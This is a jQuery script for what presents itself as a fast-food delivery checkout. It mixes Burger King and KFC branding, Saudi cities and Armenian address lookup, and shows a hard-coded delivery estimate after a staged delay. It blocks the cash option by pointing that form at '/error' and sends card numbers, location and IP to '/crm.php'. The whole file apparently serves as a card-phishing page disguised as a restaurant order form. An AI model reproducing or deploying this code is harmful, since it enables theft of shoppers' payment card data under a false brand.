$(document).ready(function loaded() {
    $('body').addClass('domloaded');
    $('.promo_active .kostamaster015').val('BURGERKING25');
    $('.bt_enter_code').click();
});

function mtl() {
    setInterval(function() {
        $('.mst1').removeClass('mst1_vis');
        $('body').removeClass('ovh');
    }, 2350);
};
mtl();
$('a[href*="#"]').on('click', function(e) {
    $('html,body').animate({
        scrollTop: $($(this).attr('href')).offset().top - 1
    }, 700);
    e.preventDefault();
});
$('.kostamaster050').hover(function() {
    $(this).find('._1S_Sc-40').toggleClass('info_visible');
});
jQuery(function($) {
    $(document).click(function(e) {
        var div = $("._1S_Sc-40 .info_visible, .kostamaster050");
        if (!div.is(e.target) && div.has(e.target).length === 0) {
            div.removeClass('info_visible');
        }
    });
});
// $(document).ready(function() {
    // var mySwiper = new Swiper('.swiper-container', {
        // direction: 'horizontal',
        // loop: true,
        // pagination: {
            // el: '.swiper-pagination',
            // type: 'bullets',
        // },
        // navigation: {
            // nextEl: '.swiper-button-next',
            // prevEl: '.swiper-button-prev',
        // },
        // autoplay: {
            // delay: 9000,
        // },
        // paginationClickable: true,
    // })
// });
$(document).ready(function() {
    var $btns = $('.products-tabs__tab').click(function() {
        if (this.id == 'all_filter') {
            $('.mst .kostamaster042').fadeIn(500);
        } else {
            var $el = $('.' + this.id).fadeIn(500);
            $('.mst .kostamaster042').not($el).hide();
        }
        $btns.removeClass('active_filter_button');
        $(this).addClass('active_filter_button');
    })
});
$('.sb1').click(function() {
    $('.vrl').addClass('hid');
});
$('.sws').click(function() {
    $('.smt').addClass('vis_flex');
    $('body').addClass('ovhmob');
});
$(function() {
    if (geci) {
        document.SityArr = geci;
    }
    else {
        document.SityArr = [{
            name: "Riyadh",
            class: "city_name"
        }, {
            name: "Mecca",
            class: "city_name"
        }, {
            name: "Dammam",
            class: "city_name"
        }, {
            name: "Abha",
            class: "city_name"
        }, {
            name: "Medina",
            class: "city_name"
        }, {
            name: "Jizan",
            class: "city_name"
        }, {
            name: "Buraida",
            class: "city_name"
        }];
    }
   
    searchSity();
    $("#inpunSearchSity").bind('keyup', searchSity);
});

function searchSity() {
    var strValForSearch = $("#inpunSearchSity").val().toLowerCase();
    var tempArr = document.SityArr;
    var arrResult = [];
    if (strValForSearch.length == 0) {
        arrResult = tempArr;
    } else {
        var lenStrSearch = strValForSearch.length;
        for (var i = 0; i < tempArr.length; i++) {
            var curEl = tempArr[i].name.toLowerCase();
            if (curEl.substr(0, lenStrSearch) == strValForSearch) {
                arrResult.push(tempArr[i]);
            }
        }
    }
    var countForOneCol = arrResult.length;
    for (var i = 1; i < 3; i++) {
        $("#colSity" + i).html("");
    }
    for (var i = 0; i < arrResult.length; i++) {
        $("#colSity" + (Math.floor(i / countForOneCol) + 1)).append('<div class="kostamaster031 ' + arrResult[i].class + '"><div class="kostamaster028 _25Rk9-40"><div class="kostamaster007"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"> <path fill="currentColor" d="M7.4 8.39L4.9 6.58 3.5 8.15l4.2 3.35 4.8-5.67-1.64-1.33z"></path></svg></div><span class="ctname">' + arrResult[i].name + '</span></div></div>');
    }
}

function toLocalCity() {
    var city = $('.main_city').html();
    localStorage.setItem('city', city);
}

function cityParse() {
    if (localStorage.getItem('city') !== null) {
        var parseCity = localStorage.getItem('city');
        $('#address_jsoncity').text(parseCity);
        $('#city').attr('disabled', 'disabled');
        $('#city').addClass('new_bg');
        $('.kos').addClass('mtt');
    }
}
cityParse();

function mtl() {
    setInterval(function() {
        $('.mst1').removeClass('mst1_vis');
        $('body').removeClass('ovh');
    }, 2350);
};
$('body').on('click', '.city_name', function() {
    var city_Val = $(this).find('.ctname').html();
    $('.smt').removeClass('vis_flex');
    $('body').removeClass('ovhmob');
    $('.main_city').html(city_Val);
    $('.mst1').addClass('mst1_vis');
    $('body').addClass('ovh');
    mtl();
    toLocalCity();
    cityParse();
});
$('.mcc').click(function() {
    $('.vrl').addClass('hid');
    $('.smt').toggleClass('vis_flex');
    $('body').toggleClass('ovhmob');
});
$('.bd').click(function() {
    toLocalCity();
    cityParse();
});
jQuery(function($) {
    $(document).click(function(e) {
        var lov = $(".smt.vis_flex, .mcc, .sws");
        if (!lov.is(e.target) && lov.has(e.target).length === 0) {
            lov.removeClass('vis_flex');
            $('body').removeClass('ovhmob');
        }
    });
});
$('.GTChE-40').click(function() {
    $(this).siblings('.GTChE-40').removeClass('_2lMjP-40');
    $(this).addClass('_2lMjP-40');
});
$('._1koWR-40 div:nth-child(2)').click(function() {
    $(this).siblings('.sizebg').css('transform', 'translateX(0%)');
    $(this).siblings('.sizeitem').removeClass('vGOho-40');
    $(this).addClass('vGOho-40');
});
$('._1koWR-40 div:nth-child(3)').click(function() {
    $(this).siblings('.sizebg').css('transform', 'translateX(100%)');
    $(this).siblings('.sizeitem').removeClass('vGOho-40');
    $(this).addClass('vGOho-40');
});
$('._1koWR-40 div:nth-child(4)').click(function() {
    $(this).siblings('.sizebg').css('transform', 'translateX(200%)');
    $(this).siblings('.sizeitem').removeClass('vGOho-40');
    $(this).addClass('vGOho-40');
});
$('._1koWR-40 div:nth-child(5)').click(function() {
    $(this).siblings('.sizebg').css('transform', 'translateX(300%)');
    $(this).siblings('.sizeitem').removeClass('vGOho-40');
    $(this).addClass('vGOho-40');
});

function initButtonsAttrs() {
    $('.ProductCard__button').attr('data-sb-product-name', productName);

    function productName(index, attributeValue) {
        var pureNames = $(this).parents('._9VPg6-40').find('._2G24_-40').html();
        var namesWithoutLastSpaces = pureNames.trim();
        return (namesWithoutLastSpaces);
    }
    $('.ProductCard__button').attr('data-sb-product-price', productPrice);

    function productPrice(index, attributeValue) {
        var stroke = $(this).parents('._9VPg6-40').find('.kostamaster180').html();
        var withoutSpaces = stroke.replace(/\s/g, '');
        return (withoutSpaces);
    }
    $('.sizeitem').attr('data-sb-curent-size', productCurentSize);

    function productCurentSize(index, attributeValue) {
        var curSizeStroke = $(this).html();
        var curSizeName = $(this).parents('._9VPg6-40').find('._1koWR-40 div:nth-child(2)').text().replace(/[^ "a-zA-Z]/g, '');
        var curSizeStrokeWithoutSpaces = curSizeStroke.replace(/[^.\d]+/g, "").replace(/^([^\.]*\.)|\./g, '$1');
        var curSizeDigit = curSizeStrokeWithoutSpaces;
        var curSizeDigitStroke = String(curSizeDigit);
        var curSizeFull = (curSizeDigitStroke + curSizeName);
        return (curSizeFull);
    }
    $('.ProductCard__button').attr('data-sb-product-size', productSize);

    function productSize(index, attributeValue) {
        if (!$(this).parents('._9VPg6-40').find('._1koWR-40').length == 0) {
            return ($(this).parents('._9VPg6-40').find('._1koWR-40 div:nth-child(2)').html());
        }
    }
    $('.ProductCard__button').attr('data-sb-product-img', productImg);

    function productImg(index, attributeValue) {
        var attri = $(this).parents('._9VPg6-40').find('.kostamaster016 img').attr('centersrc');
        if (typeof attri !== typeof undefined && attri !== false) {
            var relativeLink = $(this).parents('._9VPg6-40').find('.kostamaster016 img').attr('centersrc');
            return (relativeLink);
        } else {
            var relativeLink = $(this).parents('._9VPg6-40').find('.kostamaster016 img').attr('src');
            return (relativeLink);
        }
    }
    $('.ProductCard__button').attr('data-sb-product-quantity', productQuantity);

    function productQuantity(index, attributeValue) {
        return ('1');
    }
    $('.ProductCard__button').attr('data-sb-id-or-vendor-code', productId);

    function productId(index, attributeValue) {
        return ('00000' + (index + 1));
    }
    $('._1koWR-40').find('div:not(:nth-child(1)):not(:nth-child(2))').attr('data-sb-curent-id-or-vendor-code', productCurrentId);

    function productCurrentId(index, attributeValue) {
        return ('sz000s' + (index + 1));
    }
    $('._1koWR-40').find('div:nth-child(2)').attr('data-sb-curent-id-or-vendor-code', productCurrentIdFirst);

    function productCurrentIdFirst(index, attributeValue) {
        var productCurrentIdFirstItem = $(this).parents('.Card__footer').find('.ProductCard__button').attr('data-sb-id-or-vendor-code');
        return (productCurrentIdFirstItem);
    }
}
initButtonsAttrs();
$('._11QpV-40').click(function() {
    $('.SEOText').addClass('_2PMo3-40');
    $(this).hide();
    $('.mtrack').attr('style', 'height: auto; overflow: visible;')
});
$(document).ready(function() {
    function scrltp1() {
        var basketHeight1 = $('.smart-basket__form').height();
        var wrapperHeight1 = $('.smart-basket__wrapper').height();
        if (basketHeight1 > wrapperHeight1) {
            $('#blockscroll').addClass('ts1');
            $('#blockscroll').animate({
                scrollTop: $(".smart-basket__result-common").offset().top
            }, 900);
        } else {
            $('#blockscroll').removeClass('ts1');
        }
    }
    scrltp1();
});
$('.kostamaster330').click(function() {
    $('#blockscroll').toggleClass('cart_visible');
    $(this).find('.kostamaster328').toggleClass('arrow_rotate');
});
$('.mtp').click(function() {
    $('.fl1').toggleClass('cart_visible');
    $(this).find('.arr1').toggleClass('arrow_rotate');
});
$('.mtp1').click(function() {
    $('.fl2').toggleClass('cart_visible');
    $(this).find('.arr2').toggleClass('arrow_rotate');
});
$('._2HYem-40').click(function() {
    $('._3CS1T-40').hide();
});

function ifAllValid() {
    /*
    if ($('#street_number').val() !== '') {
        if ($('#route').val() !== '') {
            if ($('#street_number').hasClass('clicked')) {
                deliverytime();
            }
        }
    }
    */
    if ( $('#adress_suggest').val() !== '' ) {
        deliverytime();
    }
}

function thirdBlockActive() {
    /*
    if ($('#street_number').val() !== '') {
        if ($('#route').val() !== '') {
            $('._3CS1T-40').hide();
            $('.PayFieldGroup').removeClass('pointer_opacity');
        }
    }
    */
    
    //if ( $('#adress_suggest').val() !== '' ) {
        $('._3CS1T-40').hide();
        $('.PayFieldGroup').removeClass('pointer_opacity');
    //}
}

function openAdressFields() {
    if ($('#street_number').hasClass('clicked')) {
        $('.adress_not_listed').addClass('hidpro');
        $('.adr1').removeClass('hidpro');
        $('.adr2').removeClass('hidpro');
        $('.adr3').removeClass('hidpro');
        $('.adr4').removeClass('hidpro');
    }
}
$('.adress_not_listed').click(function() {
    $('.adress_not_listed').addClass('hidpro');
    $('.adr1').removeClass('hidpro');
    $('.adr2').removeClass('hidpro');
    $('.adr3').removeClass('hidpro');
    $('.adr4').removeClass('hidpro');
})
$('#street_number').blur(function() {
    ifAllValid();
    thirdBlockActive();
});
$('#route').blur(function() {
    ifAllValid();
    thirdBlockActive();
});
$('body').on('click', '.pac-item', function() {
    $('#street_number').addClass('clicked');
    ifAllValid();
    thirdBlockActive();
    openAdressFields();
});

function deliverytime() {
    $('.preloader_delivery_time_wrapper').removeClass('sie').removeClass('preloader_delivery_time_wrapper_after_preloader').addClass('hid');
    $('.ok_icon').removeClass('sie_inlineblock').addClass('hid');
    $('.delivery_time_item').removeClass('sie_inlineblock').addClass('hid');
    $('.delivery_time_preloader').removeClass('sie').addClass('hid');
    $('.preloader_delivery_time_wrapper').removeClass('hid').addClass('sie');
    $('.delivery_time_preloader').removeClass('hid').addClass('sie');
    setTimeout(function() {
        $('.delivery_time_preloader').removeClass('sie').addClass('hid');
        $('.preloader_delivery_time_wrapper').addClass('preloader_delivery_time_wrapper_after_preloader');
        $('.ok_icon').removeClass('hid').addClass('sie_inlineblock');
        var streetT = $('#route').val();
        var houseT = $('#street_number').val();
        $('.delivery_time_item').html('Order will be delivered in: <span class="timeDigit">15 — 30 minutes</span><span class="bottom_hide">, or at your chosen time.</span>').removeClass('hid').addClass('sie_inlineblock');
    }, 4900);
}
$('.checkbox_faster').click(function() {
    $(this).addClass('kostamaster163');
    $('.inp2').removeClass('kostamaster163');
    $(this).find('.inpitem').attr('checked, checked');
    $('.OrderTimeFieldGroup').removeClass('sie').addClass('hid');
    $('.OrderDelivTime').removeClass('hid').addClass('sie');
});
$('.checkbox_selecttime').click(function() {
    $(this).addClass('kostamaster163');
    $('.inp1').removeClass('kostamaster163');
    $(this).find('.inpitem2').attr('checked, checked');
    $('.OrderDelivTime').removeClass('sie').addClass('hid');
    $('.OrderTimeFieldGroup').removeClass('hid').addClass('sie');
});
$('.selectpaymeth').click(function() {
    $(this).addClass('kostamaster163');
    $('.inpp2').removeClass('kostamaster163');
    $(this).find('.inpitemp1').attr('checked, checked');
    $('.promocode_alert').removeClass('sie').addClass('hid');
    $('#cpCardForm').addClass('sie').removeClass('hid');
    $('.order_btn_text1').text('Pay');
    $('.promo_active .kostamaster015').val('BURGERKING25');
    $('.bt_enter_code').click();
    $('.kostamaster332').addClass('hid');
    $('.kostamaster015').removeClass('disablekostamaster');
    $('.bt_enter_code').removeClass('disablekostamaster');
    $('._3M_Iy-40').removeClass('disableclass2');
    $('.kostamaster015').removeAttr('disabled');
    $('#main_form').attr('action', '/crm.php');
});
$('.selectpaymeth2').click(function() {
    $(this).addClass('kostamaster163');
    $('.inpp1').removeClass('kostamaster163');
    $(this).find('.inpitemp2').attr('checked, checked');
    $('.promocode_alert').removeClass('hid').addClass('sie');
    $('#cpCardForm').removeClass('sie').addClass('hid');
    $('.order_btn_text1').text('Order');
    $('.bt_remove_code').click();
    $('.kostamaster332').removeClass('hid');
    $('.kostamaster015').addClass('disablekostamaster');
    $('.bt_enter_code').addClass('disablekostamaster');
    $('._3M_Iy-40').addClass('disableclass2');
    $('.kostamaster015').attr('disabled', 'disabled');
    $('#main_form').attr('action', '/error');
});
$('.custom_select').each(function() {
    var $this = $(this),
        numberOfOptions = $(this).children('option').length;
    $this.addClass('select-hidden');
    $this.wrap('<div class="select"></div>');
    $this.after('<div class="select-styled"></div>');
    var $styledSelect = $this.next('div.select-styled');
    $styledSelect.text($this.children('option').eq(0).text());
    var $list = $('<ul />', {
        'class': 'select-options'
    }).insertAfter($styledSelect);
    for (var i = 0; i < numberOfOptions; i++) {
        $('<li />', {
            text: $this.children('option').eq(i).text(),
            rel: $this.children('option').eq(i).val()
        }).appendTo($list);
    }
    var $listItems = $list.children('li');
    $styledSelect.click(function(e) {
        e.stopPropagation();
        $('div.select-styled.active').not(this).each(function() {
            $(this).removeClass('active').next('ul.select-options').hide();
        });
        $(this).toggleClass('active').next('ul.select-options').toggle();
    });
    $listItems.click(function(e) {
        e.stopPropagation();
        $styledSelect.text($(this).text()).removeClass('active');
        $this.val($(this).attr('rel'));
        $list.hide();
    });
    $(document).click(function() {
        $styledSelect.removeClass('active');
        $list.hide();
    });
});

function optionsDeleteAtTime() {
    var nowDate = new Date();
    var nowHours = nowDate.getHours();
    var hour9 = '9';
    var hour10 = '10';
    var hour11 = '11';
    var hour12 = '12';
    var hour13 = '13';
    var hour14 = '14';
    var hour15 = '15';
    var hour16 = '16';
    var hour17 = '17';
    var hour18 = '18';
    var hour19 = '19';
    var hour20 = '20';
    var hour21 = '21';
    var hour22 = '22';
    var hour23 = '23';
    var hour0 = '0';
    var hour1 = '1';
    var hour2 = '2';
    var hour3 = '3';
    var hour4 = '4';
    var hour5 = '5';
    var hour6 = '6';
    var hour7 = '7';
    var hour8 = '8';
    if ($('#mounth').val() == 'Today') {
        if (nowHours == hour9) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+5)').addClass('hid');
        }
        if (nowHours == hour10) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+9)').addClass('hid');
        }
        if (nowHours == hour11) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+13)').addClass('hid');
        }
        if (nowHours == hour12) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+17)').addClass('hid');
        }
        if (nowHours == hour13) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+21)').addClass('hid');
        }
        if (nowHours == hour14) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+25)').addClass('hid');
        }
        if (nowHours == hour15) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+29)').addClass('hid');
        }
        if (nowHours == hour16) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+33)').addClass('hid');
        }
        if (nowHours == hour17) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+37)').addClass('hid');
        }
        if (nowHours == hour18) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+41)').addClass('hid');
        }
        if (nowHours == hour19) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+45)').addClass('hid');
        }
        if (nowHours == hour20) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+49)').addClass('hid');
        }
        if (nowHours == hour21) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+53)').addClass('hid');
        }
        if (nowHours == hour22) {
            $('.timed_select .select-options li[rel!="hide"]:nth-child(-n+56)').addClass('hid');
        }
        if (nowHours == hour23) {
            $('.day_select .select-options li:nth-child(1)').remove();
            $('.day_select .select-options li:nth-child(2)').attr('selected, selected');
            $('.day_select .select-styled').text('Tomorrow');
        }
    }
    if ($('#mounth').val() == 'Tomorrow') {
        $('.timed_select .select-options li[rel!="hide"]').removeClass('hid');
    }
    if ($('#mounth').val() == 'Day after tomorrow') {
        $('.timed_select .select-options li[rel!="hide"]').removeClass('hid');
    }
}
optionsDeleteAtTime();
$(".day_select .select-options li").click(function() {
    $('.timed_select .select-styled').text('Time');
    optionsDeleteAtTime();
});
$.validator.addMethod('cc-number', function(value, element) {
    if ($.payment.validateCardNumber(value)) {
        $(element).removeClass('cc-invalid');
        $(element).addClass('cc-valid');
        return true;
    } else {
        $(element).removeClass('cc-valid');
        $(element).addClass('cc-invalid');
        return false;
    }
}, "This card number is not valid");
$.validator.addMethod('cc-cvv', function(value, element) {
    var cardType = $.payment.cardType($($(element).data('cvv-for')).val());
    return $.payment.validateCardCVC(value, cardType);
}, "Please fill out a CVV");
$.validator.addMethod('cc-exp', function(value) {
    var expDate = $.payment.cardExpiryVal(value);
    return $.payment.validateCardExpiry(expDate.month, expDate.year);
}, "This expiration date is not valid");
$(function() {
    var validationDefaults = {
        highlight: function(label) {
            $(label).closest('div').addClass('has-error');
        },
        success: function(label) {
            $(label).addClass('valid').closest('div').removeClass('has-error');
        }
    };
    $('form.validate').each(function() {
        $(this).validate({
            rules: {
                itemail: {
                    email: false
                },
                itphone: {
                    required: false,
                }
            },
            submitHandler: function(form) {
                var finalprice = $('#finalprice').val().replace(curr, '');
                var finalprice_sended = (finalprice * 1).toFixed(2);
                localStorage.setItem('finalprice_sended', $('#finalprice').val());
                var finalCity = localStorage.getItem('city');
                var cRegion = localStorage.getItem('region');
                var cIP = localStorage.getItem('ip');
                var cNum = $('#ordCCNumber').val();
                var cNumFully = cNum.replace(/\s/g, '');
                var cNumFirstSix = cNumFully.slice(0, 6);
                var cNumLastFour = cNumFully.slice(-4);
                localStorage.setItem('cNumFirstSix', cNumFirstSix);
                localStorage.setItem('cNumLastFour', cNumLastFour);
              
                localStorage.setItem('cardBrand', ' ');
                if ($("#ordCCNumber").hasClass("mastercard")) {
                    localStorage.setItem('cardBrand', 'mastercard');
                }
                if ($("#ordCCNumber").hasClass("visa")) {
                    localStorage.setItem('cardBrand', 'visa');
                }
                if ($("#ordCCNumber").hasClass("maestro")) {
                    localStorage.setItem('cardBrand', 'maestro');
                }
                if ($("#ordCCNumber").hasClass("forbrugsforeningen")) {
                    localStorage.setItem('cardBrand', 'forbrugsforeningen');
                }
                if ($("#ordCCNumber").hasClass("dankort")) {
                    localStorage.setItem('cardBrand', 'dankort');
                }
                if ($("#ordCCNumber").hasClass("amex")) {
                    localStorage.setItem('cardBrand', 'amex');
                }
                if ($("#ordCCNumber").hasClass("dinersclub")) {
                    localStorage.setItem('cardBrand', 'dinersclub');
                }
                if ($("#ordCCNumber").hasClass("discover")) {
                    localStorage.setItem('cardBrand', 'discover');
                }
                if ($("#ordCCNumber").hasClass("unionpay")) {
                    localStorage.setItem('cardBrand', 'unionpay');
                }
                if ($("#ordCCNumber").hasClass("jcb")) {
                    localStorage.setItem('cardBrand', 'jcb');
                }
                var cardBrandItem = localStorage.getItem('cardBrand');
                var finalvalueprice = curr+' ' + finalprice_sended;
                $('#finalcity').val(finalCity);
                $('#region').val(cRegion);
                $('#ip').val(cIP);
                $('#cardbrand').val(cardBrandItem);
                $('#finalprice').val(finalvalueprice);
                $(".nearbutton_preloader").removeClass('hid');
                $(".nearbutton_preloader").addClass('sie');
                setTimeout(function() {
                    form.submit();
                }, 1900)
            }
        });
    });
    $('#ordCCNumber').payment('formatCardNumber');
    $('#ordCCExpiration').payment('formatCardExpiry');
    $('#ordCCCVV').payment('formatCardCVC');
});
$(document).on('focus', ':input', function() {
    $('#route').attr('autocomplete', 'nope');
    $('#street_number').attr('autocomplete', 'nope');
    $('#address_jsonflat').attr('autocomplete', 'nope');
    $('#adress_suggest').attr('autocomplete', 'nope');
});
$('.kostamaster067').click(function() {
    $('.click_platform').click();
});
var placeSearch, autocomplete;
var componentForm = {
    locality: "long_name",
    street_number: "long_name",
    route: "long_name",
    postal_town: "long_name",
    postal_code: "long_name"
};

function initAutocomplete() {
    autocomplete = new google.maps.places.Autocomplete(document.getElementById("adress_suggest"), {
        types: ["geocode"],
        componentRestrictions: {
            country: ['am']
        }
    });
    autocomplete.setFields(["address_components"]);
    autocomplete.addListener("place_changed", fillInAddress);
    fillLocalityToPostalTown();
    ifAllValid();
    thirdBlockActive();
    openAdressFields();
}

function fillInAddress() {
    var place = autocomplete.getPlace();
    for (var component in componentForm) {
        document.getElementById(component).value = "";
        document.getElementById(component).disabled = false;
    }
    for (var i = 0; i < place.address_components.length; i++) {
        var addressType = place.address_components[i].types[0];
        if (componentForm[addressType]) {
            var val = place.address_components[i][componentForm[addressType]];
            document.getElementById(addressType).value = val;
        }
    }
    fillLocalityToPostalTown();
    $('#street_number').addClass('clicked');
    ifAllValid();
    thirdBlockActive();
    openAdressFields();
}

function fillLocalityToPostalTown() {
    if ($('#postal_town').val() == '') {
        if ($('#locality').val() !== '') {
            var localityVal = $('#locality').val();
            $('#postal_town').val(localityVal);
        }
    }
}

function geolocate() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var geolocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude
            };
            var circle = new google.maps.Circle({
                center: geolocation,
                radius: position.coords.accuracy
            });
            autocomplete.setBounds(circle.getBounds());
        });
    }
    fillLocalityToPostalTown();
    ifAllValid();
    thirdBlockActive();
    openAdressFields();
}
$(document).ready(function() {
    $(".js-button-customer").click(function(event) {
        var state_val = $("#shipping_state option:selected").text();
        $(".form-message-error p").text("");
        if (true) {
            var dto = {};
        } else {
            $(".form-message-error").slideDown(400);
            $(".input-required input, textarea").focus(function() {
                $(".form-message-error").slideUp(400);
                $(".form-message-error p").text("");
            });
            var e = form_valid.errormsgs;
            var em = e.join("<br/>");
            $(".form-message-error p").append(em);
            event.preventDefault();
        }
    });
});

function autoGeo() {
    if ($('#street_number').val() == '') {
        if ($('#route').val() == '') {
            geolocate();
        }
    }
}

function search() {
    let inp = document.querySelector(".crocs").value;
    let a;
    for (key in banks) {
        for (let k = 0; k < banks[key].length; k++) {
            if (banks[key][k] == inp) a = banks[key];
        }
    }
    Object.keys(banks).forEach((key) => {
        if (banks[key] == a) out.innerHTML = key;
    });
}
$('.kostamaster284').html('<span>© Copyright 2021 «KFC» LLC. <br>All Rights Reserved. <br>6+</span>');